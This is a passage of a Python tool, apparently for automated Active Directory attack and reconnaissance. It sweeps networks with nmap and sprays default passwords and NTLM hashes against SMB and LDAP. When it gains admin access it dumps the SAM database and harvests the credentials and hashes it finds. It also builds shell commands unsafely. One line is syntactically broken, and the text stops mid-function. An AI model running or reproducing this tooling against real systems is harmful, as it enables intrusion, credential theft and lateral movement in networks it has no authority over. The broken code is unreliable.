#!/usr/bin/env python3
import argparse
import subprocess
import sys
import os
import json
import time
import random
import re
import socket
import ipaddress
from pathlib import Path
from datetime import datetime
from typing import List, Dict, Any, Optional, Union, Set, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

# Import shared configuration if available
try:
    from config import (
        TARGETS, DOMAIN_USERS, DOMAIN_PASSWORDS, NTLM_HASHES,
        LOG_DIRECTORY, RESULTS_DIRECTORY, TIMEOUT, MAX_THREADS
    )
except ImportError:
    # Default values if config.py is not found
    TARGETS = []
    DOMAIN_USERS = ["administrator", "admin"]
    DOMAIN_PASSWORDS = ["Password123!", "P@ssw0rd"]
    NTLM_HASHES = []
    LOG_DIRECTORY = "logs"
    RESULTS_DIRECTORY = "results"
    TIMEOUT = 60
    MAX_THREADS = 10

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Logger:
    @staticmethod
    def section(text: str):
        print(f"\n{Colors.BOLD}{Colors.BLUE}{'=' * 50}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.BLUE}{text.center(50)}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.BLUE}{'=' * 50}{Colors.ENDC}\n")

    @staticmethod
    def subsection(text: str):
        print(f"\n{Colors.YELLOW}{'-' * 40}{Colors.ENDC}")
        print(f"{Colors.YELLOW}{text}{Colors.ENDC}")
        print(f"{Colors.YELLOW}{'-' * 40}{Colors.ENDC}\n")

    @staticmethod
    def command(cmd: str):
        print(f"{Colors.CYAN}[+] Executing: {cmd}{Colors.ENDC}\n")

    @staticmethod
    def success(text: str):
        print(f"{Colors.GREEN}[+] {text}{Colors.ENDC}")

    @staticmethod
    def error(text: str):
        print(f"{Colors.RED}[-] {text}{Colors.ENDC}")

    @staticmethod
    def info(text: str):
        print(f"{Colors.BLUE}[*] {text}{Colors.ENDC}")
        
    @staticmethod
    def warning(text: str):
        print(f"{Colors.YELLOW}[!] {text}{Colors.ENDC}")
        
    @staticmethod
    def progress(current: int, total: int, prefix: str = '', suffix: str = '', decimals: int = 1, length: int = 50, fill: str = '█'):
        """Print a progress bar"""
        percent = ("{0:." + str(decimals) + "f}").format(100 * (current / float(total)))
        filled_length = int(length * current // total)
        bar = fill * filled_length + '-' * (length - filled_length)
        print(f'\r{Colors.BLUE}[*] {prefix} |{bar}| {percent}% {suffix}{Colors.ENDC}', end='\r')
        if current == total:
            print()

class ADAutoRecon:
    """Comprehensive Active Directory reconnaissance automation"""
    def __init__(self, output_dir: str = None):
        self.script_dir = Path(__file__).parent.absolute()
        
        # Setup directories
        self.log_dir = Path(LOG_DIRECTORY)
        self.results_dir = Path(output_dir) if output_dir else Path(RESULTS_DIRECTORY) / "autorecon"
        
        self.log_dir.mkdir(parents=True, exist_ok=True)
        self.results_dir.mkdir(parents=True, exist_ok=True)
        
        # Initialize time tracking
        self.start_time = None
        self.end_time = None
        
        # Initialize credential store
        self.credentials = []
        self.hashes = []
        
        # Track found domain controllers
        self.domain_controllers = []
        
        # Track domain info
        self.domain_name = None
        self.forest_name = None
        
        # Initialize tool paths
        self._initialize_tool_paths()
        
        # Create subdirs for different scan types
        self.network_dir = self.results_dir / "network"
        self.services_dir = self.results_dir / "services"
        self.domain_dir = self.results_dir / "domain"
        self.creds_dir = self.results_dir / "credentials"
        self.vulns_dir = self.results_dir / "vulnerabilities"
        
        self.network_dir.mkdir(exist_ok=True)
        self.services_dir.mkdir(exist_ok=True)
        self.domain_dir.mkdir(exist_ok=True)
        self.creds_dir.mkdir(exist_ok=True)
        self.vulns_dir.mkdir(exist_ok=True)
        
        # Log file for current scan
        self.log_file = self.log_dir / f"autorecon_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        
    def _initialize_tool_paths(self):
        """Find paths to required tools"""
        self.tool_paths = {}
        
        # Internal tools
        self.tool_paths["netexec_wrapper"] = self._find_tool("netexec-enumerator.py")
        self.tool_paths["kerberoast"] = self._find_tool("kerberoast.py")
        self.tool_paths["impacket_toolkit"] = self._find_tool("impacket-toolkit.py")
        self.tool_paths["powershell_enum"] = self._find_tool("powershell-enumeration.py")
        self.tool_paths["mimikatz_wrapper"] = self._find_tool("mimikatz-wrapper.py")
        
        # External tools
        self.tool_paths["nmap"] = self._find_command("nmap")
        self.tool_paths["netexec"] = self._find_command("netexec")
        self.tool_paths["crackmapexec"] = self._find_command("crackmapexec")  # Fallback for netexec
        self.tool_paths["enum4linux"] = self._find_command("enum4linux")
        self.tool_paths["bloodhound-python"] = self._find_command("bloodhound-python")
        self.tool_paths["ldapsearch"] = self._find_command("ldapsearch")
        self.tool_paths["smbclient"] = self._find_command("smbclient")
        self.tool_paths["GetUserSPNs.py"] = self._find_command("GetUserSPNs.py")
        self.tool_paths["GetNPUsers.py"] = self._find_command("GetNPUsers.py")
        
    def _find_tool(self, tool_name: str) -> Optional[Path]:
        """Find internal tool script"""
        # Look in the current directory and project directory
        locations = [
            self.script_dir / tool_name,
            self.script_dir.parent / tool_name,
            Path(tool_name)
        ]
        
        for location in locations:
            if location.exists():
                return location
        
        return None
    
    def _find_command(self, command: str) -> Optional[str]:
        """Find external command in PATH"""
        try:
            # Try Unix which
            which_result = subprocess.run(["which", command], capture_output=True, text=True)
            if which_result.returncode == 0:
                return which_result.stdout.strip()
            
            # Try Windows where
            where_result = subprocess.run(["where", command], capture_output=True, text=True, shell=True)
            if where_result.returncode == 0:
                return where_result.stdout.strip().split('\n')[0]
            
            return None
        except:
            return None
    
    def execute_command(self, command: str, description: str) -> str:
        """Execute a shell command and return its output"""
        try:
            Logger.command(command)
            
            # Write command to log file
            with open(self.log_file, 'a') as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] COMMAND: {command}\n")
            
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout if result.stdout else result.stderr
            
            # Write output to log file
            with open(self.log_file, 'a') as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] OUTPUT:\n{output}\n")
                f.write("-" * 80 + "\n")
            
            if result.returncode == 0:
                if output.strip():
                    Logger.success(f"Successfully completed: {description}")
                else:
                    Logger.info("Command completed but no output returned")
            else:
                Logger.error(f"Command failed: {output}")
                
            return output
        except Exception as e:
            error_msg = f"Error executing command: {str(e)}"
            Logger.error(error_msg)
            
            # Write error to log file
            with open(self.log_file, 'a') as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] ERROR: {error_msg}\n")
                f.write("-" * 80 + "\n")
            
            return error_msg
    
    def save_results(self, output: str, filename: str, subdir: Optional[Path] = None) -> Path:
        """Save results to a file in the appropriate directory"""
        if subdir:
            output_dir = subdir
        else:
            output_dir = self.results_dir
            
        filepath = output_dir / filename
        
        with open(filepath, 'w') as f:
            f.write(output)
        
        Logger.success(f"Results saved to {filepath}")
        return filepath
    
    def save_json_results(self, data: Dict, filename: str, subdir: Optional[Path] = None) -> Path:
        """Save JSON results to a file"""
        if subdir:
            output_dir = subdir
        else:
            output_dir = self.results_dir
            
        filepath = output_dir / filename
        
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=4)
        
        Logger.success(f"Results saved to {filepath}")
        return filepath
    
    def add_credential(self, domain: str, username: str, password: str, source: str) -> None:
        """Add a credential to the store"""
        cred = {
            "domain": domain,
            "username": username,
            "password": password,
            "source": source,
            "timestamp": str(datetime.now())
        }
        
        # Check if credential already exists
        for existing_cred in self.credentials:
            if (existing_cred["domain"] == domain and 
                existing_cred["username"] == username and 
                existing_cred["password"] == password):
                return
        
        self.credentials.append(cred)
        Logger.success(f"Added credential for {domain}\\{username} from {source}")
        
        # Save updated credentials
        self.save_json_results(
            {"credentials": self.credentials}, 
            "found_credentials.json", 
            self.creds_dir
        )
    
    def add_hash(self, domain: str, username: str, ntlm_hash: str, source: str) -> None:
        """Add a hash to the store"""
        hash_entry = {
            "domain": domain,
            "username": username,
            "hash": ntlm_hash,
            "source": source,
            "timestamp": str(datetime.now())
        }
        
        # Check if hash already exists
        for existing_hash in self.hashes:
            if (existing_hash["domain"] == domain and 
                existing_hash["username"] == username and 
                existing_hash["hash"] == ntlm_hash):
                return
        
        self.hashes.append(hash_entry)
        Logger.success(f"Added hash for {domain}\\{username} from {source}")
        
        # Save updated hashes
        self.save_json_results(
            {"hashes": self.hashes}, 
            "found_hashes.json", 
            self.creds_dir
        )
    
    def parse_creds_from_output(self, output: str, source: str) -> None:
        """Parse credentials from command output"""
        # Look for common credential patterns
        
        # Pattern: domain\username:password
        domain_user_pass = re.findall(r'([^\\:]+)\\([^:]+):([^\s]+)', output)
        for domain, username, password in domain_user_pass:
            self.add_credential(domain, username, password, source)
        
        # Pattern: username:password
        user_pass = re.findall(r'([^:\\]+):([^\s]+)', output)
        for username, password in user_pass:
            if '\\' not in username and ':' not in username:
                self.add_credential("", username, password, source)
        
        # Look for NTLM hashes
        # Pattern: username::domain:hash
        ntlm_hashes = re.findall(r'([^:]+)::([^:]+):([a-fA-F0-9]{32})', output)
        for username, domain, ntlm_hash in ntlm_hashes:
            self.add_hash(domain, username, ntlm_hash, source)
            
        # Pattern: username:hash
        simple_hashes = re.findall(r'([^:]+):[a-fA-F0-9]{32}', output)
        for username in simple_hashes:
            if '\\' not in username and ':' not in username:
                hash_match = re.search(fr'{re.escape(username)}:([a-fA-F0-9]{{32}})', output)
                if hash_match:
                    self.add_hash("", username, hash_match.group(1), source)
    
    def _get_all_credentials(self) -> List[Dict[str, str]]:
        """Get all available credentials for auth attempts"""
        creds = []
        
        # Add found credentials
        for cred in self.credentials:
            creds.append({
                "domain": cred["domain"],
                "username": cred["username"],
                "password": cred["password"],
                "hash": None
            })
            
        # Add found hashes
        for hash_entry in self.hashes:
            creds.append({
                "domain": hash_entry["domain"],
                "username": hash_entry["username"],
                "password": None,
                "hash": hash_entry["hash"]
            })
            
        # Add credentials from config if we don't have any yet
        if not creds:
            for username in DOMAIN_USERS:
                for password in DOMAIN_PASSWORDS:
                    creds.append({
                        "domain": "",
                        "username": username,
                        "password": password,
                        "hash": None
                    })
                
            for username in DOMAIN_USERS:
                for hash_value in NTLM_HASHES:
                    creds.append({
                        "domain": "",
                        "username": username,
                        "password": None,
                        "hash": hash_value
                    })
                    
        return creds
    
    def is_ip_address(self, target: str) -> bool:
        """Check if target is an IP address"""
        try:
            ipaddress.ip_address(target)
            return True
        except ValueError:
            return False
            
    def resolve_hostname(self, target: str) -> Optional[str]:
        """Resolve hostname to IP address"""
        try:
            return socket.gethostbyname(target)
        except socket.gaierror:
            return None
            
    def determine_target_type(self, target: str) -> str:
        """Determine target type (individual host, subnet, hostname)"""
        # Check if it's a CIDR subnet
        if '/' in target:
            try:
                ipaddress.ip_network(target, strict=False)
                return "subnet"
            except ValueError:
                pass
        
        # Check if it's an IP or hostname
        if self.is_ip_address(target):
            return "ip"
        else:
            return "hostname"
    
    def network_discovery(self, target: str, fast_scan: bool = False) -> Dict[str, Any]:
        """Perform network discovery against target"""
        Logger.section(f"Network Discovery: {target}")
        
        target_type = self.determine_target_type(target)
        discovered_hosts = []
        
        # Define output files
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        target_safe = target.replace('/', '_').replace('.', '_')
        ping_output_file = f"{target_safe}_ping_{timestamp}.txt"
        nmap_output_file = f"{target_safe}_nmap_{timestamp}.xml"
        nmap_greppable_file = f"{target_safe}_nmap_{timestamp}.gnmap"
        
        if target_type == "subnet":
            Logger.info(f"Target is a subnet: {target}")
            
            # Use nmap ping scan for subnet
            nmap_cmd = f"nmap -sn -T4 {target} -oA {self.network_dir / target_safe}_ping_{timestamp}"
            ping_output = self.execute_command(nmap_cmd, "Ping sweep")
            
            # Save results
            self.save_results(ping_output, ping_output_file, self.network_dir)
            
            # Parse results to find live hosts
            ip_pattern = r'Nmap scan report for ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)'
            discovered_ips = re.findall(ip_pattern, ping_output)
            
            for ip in discovered_ips:
                discovered_hosts.append({
                    "ip": ip,
                    "hostname": None,
                    "status": "up"
                })
                
        elif target_type == "hostname":
            Logger.info(f"Target is a hostname: {target}")
            
            # Resolve hostname
            ip = self.resolve_hostname(target)
            if ip:
                Logger.success(f"Resolved {target} to {ip}")
                discovered_hosts.append({
                    "ip": ip,
                    "hostname": target,
                    "status": "up"
                })
            else:
                Logger.error(f"Could not resolve hostname: {target}")
                
        else:  # IP address
            Logger.info(f"Target is an IP address: {target}")
            
            # Simple ping to check if host is up
            if sys.platform == "win32":
                ping_cmd = f"ping -n 1 {target}"
            else:
                ping_cmd = f"ping -c 1 {target}"
                
            ping_output = self.execute_command(ping_cmd, "Ping check")
            
            if "bytes from" in ping_output or "TTL=" in ping_output:
                Logger.success(f"{target} is reachable")
                discovered_hosts.append({
                    "ip": target,
                    "hostname": None,
                    "status": "up"
                })
            else:
                Logger.warning(f"{target} does not respond to ping, continuing anyway")
                discovered_hosts.append({
                    "ip": target,
                    "hostname": None,
                    "status": "unknown"
                })
        
        # Perform port scan on discovered hosts
        if discovered_hosts:
            Logger.subsection("Port Scanning")
            port_results = {}
            
            for host in discovered_hosts:
                ip = host["ip"]
                
                if fast_scan:
                    # Fast scan - common ports only
                    nmap_cmd = f"nmap -T4 -F {ip} -oX {self.network_dir / nmap_output_file} -oG {self.network_dir / nmap_greppable_file}"
                else:
                    # Full scan - comprehensive
                    nmap_cmd = f"nmap -T4 -p- -sV -sC {ip} -oX {self.network_dir / nmap_output_file} -oG {self.network_dir / nmap_greppable_file}"
                
                nmap_output = self.execute_command(nmap_cmd, f"Port scan on {ip}")
                
                # Parse nmap output for services
                services = self._parse_nmap_services(nmap_output)
                port_results[ip] = services
                
                # Look for common AD services
                self._analyze_services(ip, services)
        
        result = {
            "discovered_hosts": discovered_hosts,
            "port_scan": port_results
        }
        
        # Save network discovery results
        self.save_json_results(
            result,
            f"{target_safe}_discovery_{timestamp}.json",
            self.network_dir
        )
        
        return result
    
    def _parse_nmap_services(self, nmap_output: str) -> Dict[str, Dict[str, str]]:
        """Parse nmap output for port and service information"""
        services = {}
        port_pattern = r'([0-9]+)/tcp\s+open\s+([^\s]+)(\s+(.+))?'
        
        for line in nmap_output.splitlines():
            match = re.search(port_pattern, line)
            if match:
                port = match.group(1)
                service = match.group(2)
                version = match.group(4) if match.group(4) else ""
                
                services[port] = {
                    "service": service,
                    "version": version
                }
                
        return services
    
    def _analyze_services(self, ip: str, services: Dict[str, Dict[str, str]]) -> None:
        """Analyze discovered services for AD related services"""
        # Check for common AD ports
        ad_indicators = {
            "53": "DNS",
            "88": "Kerberos",
            "135": "RPC",
            "139": "NetBIOS",
            "389": "LDAP",
            "445": "SMB",
            "464": "Kerberos Password",
            "636": "LDAPS",
            "3268": "Global Catalog",
            "3269": "Global Catalog SSL",
            "5985": "WinRM",
            "9389": "AD Web Services"
        }
        
        dc_indicators = 0
        for port, info in ad_indicators.items():
            if port in services:
                dc_indicators += 1
                Logger.info(f"Found {info} service on {ip}:{port}")
                
        # If multiple AD services are found, this is likely a domain controller
        if dc_indicators >= 3:
            Logger.success(f"{ip} is likely a Domain Controller")
            if ip not in self.domain_controllers:
                self.domain_controllers.append(ip)
                
                # Save updated DC list
                self.save_json_results(
                    {"domain_controllers": self.domain_controllers},
                    "domain_controllers.json",
                    self.domain_dir
                )
    
    def smb_enumeration(self, target: str) -> Dict[str, Any]:
        """Perform SMB enumeration against target"""
        Logger.section(f"SMB Enumeration: {target}")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        target_safe = target.replace('.', '_')
        result = {"target": target, "shares": [], "users": [], "sessions": []}
        
        # Try basic SMB enumeration with NetExec/CrackMapExec
        netexec_tool = self.tool_paths.get("netexec") or self.tool_paths.get("crackmapexec")
        if netexec_tool:
            # Anonymous enumeration first
            Logger.info("Attempting anonymous SMB enumeration")
            
            # Use the basic command without auth
            cmd = f"{netexec_tool} smb {target}"
            output = self.execute_command(cmd, "Anonymous SMB enumeration")
            
            # Save output
            self.save_results(output, f"{target_safe}_smb_anon_{timestamp}.txt", self.services_dir)
            
            # Look for shares with anonymous access
            cmd = f"{netexec_tool} smb {target} --shares"
            shares_output = self.execute_command(cmd, "Anonymous share enumeration")
            self.save_results(shares_output, f"{target_safe}_smb_shares_anon_{timestamp}.txt", self.services_dir)
            
            # Parse output for shares
            shares = re.findall(r'SHARE\s+([^\s]+)\s+([^\s]+)\s+(.+)', shares_output)
            for share in shares:
                result["shares"].append({
                    "name": share[0],
                    "permissions": share[1],
                    "comment": share[2]
                })
                
            # Now try with credentials
            creds = self._get_all_credentials()
            
            for cred in creds:
                username = cred["username"]
                domain = cred["domain"] if cred["domain"] else "."
                
                # Skip if we don't have either password or hash
                if not cred["password"] and not cred["hash"]:
                    continue
                    
                Logger.info(f"Trying SMB enumeration with {domain}\\{username}")
                
                auth_str = ""
                if cred["password"]:
                    Logger.info(f"Using password authentication")
                    auth_str = f"-u {username} -p {cred['password']}"
                elif cred["hash"]:
                    Logger.info(f"Using hash authentication")
                    auth_str = f"-u {username} -H {cred['hash']}"
                
                # Basic enum
                cmd = f"{netexec_tool} smb {target} {auth_str}"
                output = self.execute_command(cmd, f"SMB enumeration with {username}")
                
                # Check if authentication succeeded
                if "[+]" in output and "Pwn3d!" not in output:
                    Logger.success(f"Authentication succeeded with {domain}\\{username}")
                    
                    # Save credential
                    if cred["password"]:
                        self.add_credential(domain, username, cred["password"], "smb_enum")
                    elif cred["hash"]:
                        self.add_hash(domain, username, cred["hash"], "smb_enum")
                    
                    # Enum shares
                    cmd = f"{netexec_tool} smb {target} {auth_str} --shares"
                    shares_output = self.execute_command(cmd, f"Share enumeration with {username}")
                    self.save_results(shares_output, f"{target_safe}_smb_shares_{username}_{timestamp}.txt", self.services_dir)
                    
                    # Enum users
                    cmd = f"{netexec_tool} smb {target} {auth_str} --users"
                    users_output = self.execute_command(cmd, f"User enumeration with {username}")
                    self.save_results(users_output, f"{target_safe}_smb_users_{username}_{timestamp}.txt", self.services_dir)
                    
                    # Parse users
                    users = re.findall(r'([-\w]+)\\([-\w]+)\s+(\d+):', users_output)
                    for user in users:
                        domain, username, uid = user
                        if {"domain": domain, "username": username, "uid": uid} not in result["users"]:
                            result["users"].append({
                                "domain": domain,
                                "username": username,
                                "uid": uid
                            })
                    
                    # Enum sessions
                    cmd = f"{netexec_tool} smb {target} {auth_str} --sessions"
                    sessions_output = self.execute_command(cmd, f"Session enumeration with {username}")
                    self.save_results(sessions_output, f"{target_safe}_smb_sessions_{username}_{timestamp}.txt", self.services_dir)
                    
                    # Parse sessions
                    sessions = re.findall(r'([-\w]+)\\([-\w]+)\s+(\d+)\s+([^\s]+)\s+([^\s]+)\s+([^\s]+)', sessions_output)
                    for session in sessions:
                        domain, username, uid, auth_type, active, idle = session
                        if {"domain": domain, "username": username, "auth_type": auth_type} not in result["sessions"]:
                            result["sessions"].append({
                                "domain": domain,
                                "username": username,
                                "uid": uid,
                                "auth_type": auth_type,
                                "active": active,
                                "idle": idle
                            })
                    
                    # If admin access, try to dump SAM
                    if "Pwn3d!" in output:
                        Logger.success(f"Admin access with {domain}\\{username}")
                        
                        # Dump SAM
                        cmd = f"{netexec_tool} smb {target} {auth_str} --sam"
                        sam_output = self.execute_command(cmd, "SAM dumping")
                        self.save_results(sam_output, f"{target_safe}_smb_sam_{username}_{timestamp}.txt", self.creds_dir)
                        
                        # Parse SAM output for hashes
                        self.parse_creds_from_output(sam_output, "sam_dump")
                
                    # Found valid creds, no need to try more for basic enum
                    break
        
        # Try enum4linux
        if self.tool_paths.get("enum4linux"):
            Logger.info("Running enum4linux")
            cmd = f"{self.tool_paths['enum4linux']} -a {target}"
            enum4linux_output = self.execute_command(cmd, "enum4linux")
            self.save_results(enum4linux_output, f"{target_safe}_enum4linux_{timestamp}.txt", self.services_dir)
            
            # Parse enum4linux output for domain info
            domain_pattern = r'Domain Name: ([^\s]+)'
            domain_match = re.search(domain_pattern, enum4linux_output)
            if domain_match and not self.domain_name:
                self.domain_name = domain_match.group(1)
                Logger.info(f"Found domain name: {self.domain_name}")
                
                # Save domain info
                self.save_json_results(
                    {"domain_name": self.domain_name},
                    "domain_info.json",
                    self.domain_dir
                )
                
        # Try smbclient
        if self.tool_paths.get("smbclient"):
            Logger.info("Listing shares with smbclient")
            cmd = f"{self.tool_paths['smbclient']} -L {target} -N"
            smbclient_output = self.execute_command(cmd, "smbclient share listing")
            self.save_results(smbclient_output, f"{target_safe}_smbclient_{timestamp}.txt", self.services_dir)
            
        # Save all SMB enumeration results
        self.save_json_results(result, f"{target_safe}_smb_enum_{timestamp}.json", self.services_dir)
        
        return result
        
    def ldap_enumeration(self, target: str) -> Dict[str, Any]:
        """Perform LDAP enumeration against target"""
        Logger.section(f"LDAP Enumeration: {target}")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        target_safe = target.replace('.', '_')
        result = {"target": target, "domain_info": {}, "users": [], "groups": [], "computers": []}
        
        # Try anonymous LDAP bind first
        if self.tool_paths.get("ldapsearch"):
            Logger.info("Attempting anonymous LDAP enumeration")
            
            # Guess domain components from discovered domain name
            dc_components = ""
            if self.domain_name:
                dc_parts = self.domain_name.split('.')
                dc_components = ",".join([f"DC={part}" for part in dc_parts])
                
                # Try to get domain info
                cmd = f"{self.tool_paths['ldapsearch']} -x -h {target} -b \"{dc_components}\" -s base \"(objectClass=*)\""
                output = self.execute_command(cmd, "Anonymous LDAP domain query")
                self.save_results(output, f"{target_safe}_ldap_anon_domain_{timestamp}.txt", self.domain_dir)
                
                # Try to get naming contexts
                cmd = f"{self.tool_paths['ldapsearch']} -x -h {target} -b \"\" -s base \"(objectClass=*)\" namingContexts"
                output = self.execute_command(cmd, "LDAP naming contexts")
                self.save_results(output, f"{target_safe}_ldap_contexts_{timestamp}.txt", self.domain_dir)
                
                # Try to enum users anonymously
                cmd = f"{self.tool_paths['ldapsearch']} -x -h {target} -b \"{dc_components}\" \"(objectClass=user)\""
                output = self.execute_command(cmd, "Anonymous LDAP user query")
                self.save_results(output, f"{target_safe}_ldap_anon_users_{timestamp}.txt", self.domain_dir)
                
                # Check if anonymous is allowed
                anon_allowed = "result: 0 Success" in output
                
                if anon_allowed:
                    Logger.success("Anonymous LDAP bind successful!")
                    self._parse_ldap_users(output, result)
                else:
                    Logger.info("Anonymous LDAP bind not allowed")
        
        # Try authenticated LDAP enumeration
        creds = self._get_all_credentials()
        
        for cred in creds:
            # Skip if no password
            if not cred["password"]:
                continue
                
            username = cred["username"]
            password = cred["password"]
            domain = cred["domain"] if cred["domain"] else self.domain_name
            
            if not domain:
                continue
                
            Logger.info(f"Trying LDAP enumeration with {domain}\\{username}")
            
            # Create domain string for LDAP 
            dc_parts = domain.split('.')
            dc_components = ",".join([f"DC={part}" for part in dc_parts])
            
            # Create bind DN
            bind_dn = f"{username}@{domain}"
            
            # Try authenticated bind
            if self.tool_paths.get("ldapsearch"):
                cmd = f"{self.tool_paths['ldapsearch']} -x -h {target} -D \"{bind_dn}\" -w \"{password}\" -b \"{dc_components}\" -s base \"(objectClass=*)\""
                output = self.execute_command(cmd, f"LDAP bind with {username}")
                
                if "result: 0 Success" in output:
                    Logger.success(f"LDAP authentication succeeded with {bind_dn}")
                    self.add_credential(domain, username, password, "ldap_enum")
                    
                    # Now perform various LDAP queries
                    
                    # Domain info
                    cmd = f"{self.tool_paths['ldapsearch']} -x -h {target} -D \"{bind_dn}\" -w \"{password}\" -b \"{dc_components}\" -s base \"(objectClass=*)\""
                    domain_info = self.execute_command(cmd, "LDAP domain info query")
                    self.save_results(domain_info, f"{target_safe}_ldap_domain_{timestamp}.txt", self.domain_dir)
                    
                    # Users query
                    cmd = f"{self.tool_paths['ldapsearch']} -x -h {target} -D \"{bind_dn}\" -w \"{password}\" -b \"{dc_components}\" \"(&(objectClass=user)(objectCategory=person))\""
                    users_output = self.execute_command(cmd, "LDAP users query")
                    self.save_results(users_output, f"{target_safe}_ldap_users_{timestamp}.txt", self.domain_dir)
                    
                    # Parse users
                    self._parse_ldap_users(users_output, result)
                    
                    # Groups query
                    cmd = f"{self.tool_paths['ldapsearch']} -x -h {target} -D \"{bind_dn}\" -w \"{password}\" -b \"{dc_components}\" \"(objectClass=group)\""
                    groups_output = self.execute_command(cmd, "LDAP groups query")
                    self.save_results(groups_output, f"{target_safe}_ldap_groups_{timestamp}.txt", self.domain_dir)
                    
                    # Parse groups
                    self._parse_ldap_groups(groups_output, result)
                    
                    # Computers query
                    cmd = f"{self.tool_paths['ldapsearch']} -x -h {target} -D \"{bind_dn}\" -w \"{password}\" -b \"{dc_components}\" \"(objectClass=computer)\""
                    computers_output = self.execute_command(cmd, "LDAP computers query")
                    self.save_results(computers_output, f"{target_safe}_ldap_computers_{timestamp}.txt", self.domain_dir)
                    
                    # Parse computers
                    self._parse_ldap_computers(computers_output, result)
                    
                    # Domain admins query
                    cmd = f"{self.tool_paths['ldapsearch']} -x -h {target} -D \"{bind_dn}\" -w \"{password}\" -b \"{dc_components}\" \"(&(objectClass=group)(cn=Domain Admins))\""
                    domain_admins_output = self.execute_command(cmd, "LDAP Domain Admins query")
                    self.save_results(domain_admins_output, f"{target_safe}_ldap_domain_admins_{timestamp}.txt", self.domain_dir)
                    
                    # Stop after finding valid credentials
                    break
        
        # Try LDAP enumeration with NetExec
        netexec_tool = self.tool_paths.get("netexec") or self.tool_paths.get("crackmapexec")
        if netexec_tool:
            # Try with valid credentials
            for cred in creds:
                username = cred["username"]
                
                # Skip if we don't have either password or hash
                if not cred["password"] and not cred["hash"]:
                    continue
                    
                auth_str = ""
                if cred["password"]:
                    auth_str = f"-u {username} -p {cred['password']}"
                elif cred["hash"]:
                    auth_str = f"-u {username} -H {cred['hash']}"
                
                # Basic LDAP enum
                cmd = f"{netexec_tool} ldap {target} {auth_str}"
                output = self.execute_command(cmd, f"NetExec LDAP enum with {username}")
                self.save_results(output, f"{target_safe}_netexec_ldap_{username}_{timestamp}.txt", self.domain_dir)
                
                # If successful, do more detailed queries
                if "[+]" in output:
                    Logger.success(f"NetExec LDAP auth successful with {username}")
                    
                    # Get users
                    cmd = f"{netexec_tool} ldap {target} {auth_str} --users"
                    users_output = self.execute_command(cmd, "NetExec LDAP users")
                    self.save_results(users_output, f"{target_safe}_netexec_ldap_users_{timestamp}.txt", self.domain_dir)
                    
                    # Get groups
                    cmd = f"{netexec_tool} ldap {target} {auth_str} --groups"
                    groups_output = self.execute_command(cmd, "NetExec LDAP groups")
                    self.save_results(groups_output, f"{target_safe}_netexec_ldap_groups_{timestamp}.txt", self.domain_dir)
                    
                    # Get domain password policy
                    cmd = f"{netexec_tool} ldap {target} {auth_str} --pass-pol"
                    policy_output = self.execute_command(cmd, "NetExec LDAP password policy")
                    self.save_results(policy_output, f"{target_safe}_netexec_ldap_policy_{timestamp}.txt", self.domain_dir)
                    
                    # Get computers
                    cmd = f"{netexec_tool} ldap {target} {auth_str} --computers"
                    computers_output = self.execute_command(cmd, "NetExec LDAP computers")
                    self.save_results(computers_output, f"{target_safe}_netexec_ldap_computers_{timestamp}.txt", self.domain_dir)
                    
                    # Stop after finding valid credentials
                    break
        
        # Save all LDAP enumeration results
        self.save_json_results(result, f"{target_safe}_ldap_enum_{timestamp}.json", self.domain_dir)
        
        return result
        
    def _parse_ldap_users(self, ldap_output: str, result: Dict[str, Any]) -> None:
        """Parse LDAP output for user information"""
        # Extract user entries
        user_entries = re.split(r'# search result\n', ldap_output)
        
        for entry in user_entries:
            # Get sAMAccountName
            sam_match = re.search(r'sAMAccountName: (.+)', entry)
            if not sam_match:
                continue
                
            username = sam_match.group(1).strip()
            
            # Get distinguished name
            dn_match = re.search(r'dn: (.+)', entry)
            dn = dn_match.group(1).strip() if dn_match else ""
            
            # Get user principal name
            upn_match = re.search(r'userPrincipalName: (.+)', entry)
            upn = upn_match.group(1).strip() if upn_match else ""
            
            # Add user if not already in results
            if not any(u["username"] == username for u in result["users"]):
                result["users"].append({
                    "username": username,
                    "dn": dn,
                    "upn": upn
                })
                
    def _parse_ldap_groups(self, ldap_output: str, result: Dict[str, Any]) -> None:
        """Parse LDAP output for group information"""
        # Extract group entries
        group_entries = re.split(r'# search result\n', ldap_output)
        
        for entry in group_entries:
            # Get common name
            cn_match = re.search(r'cn: (.+)', entry)
            if not cn_match:
                continue
                
            group_name = cn_match.group(1).strip()
            
            # Get distinguished name
            dn_match = re.search(r'dn: (.+)', entry)
            dn = dn_match.group(1).strip() if dn_match else ""
            
            # Get sAMAccountName
            sam_match = re.search(r'sAMAccountName: (.+)', entry)
            sam = sam_match.group(1).strip() if sam_match else ""
            
            # Get members
            members = []
            member_matches = re.findall(r'member: (.+)', entry)
            if member_matches:
                members = [m.strip() for m in member_matches]
            
            # Add group if not already in results
            if not any(g["name"] == group_name for g in result["groups"]):
                result["groups"].append({
                    "name": group_name,
                    "dn": dn,
                    "sam": sam,
                    "members": members
                })
                
    def _parse_ldap_computers(self, ldap_output: str, result: Dict[str, Any]) -> None:
        """Parse LDAP output for computer information"""
        # Extract computer entries
        computer_entries = re.split(r'# search result\n', ldap_output)
        
        for entry in computer_entries:
            # Get sAMAccountName
            sam_match = re.search(r'sAMAccountName: (.+)', entry)
            if not sam_match:
                continue
                
            computer_name = sam_match.group(1).strip()
            
            # Remove $ from computer name if present
            if computer_name.endswith('):
                computer_name = computer_name[:-1]
                
            # Get distinguished name
            dn_match = re.search(r'dn: (.+)', entry)
            dn = dn_match.group(1).strip() if dn_match else ""
            
            # Get DNS hostname
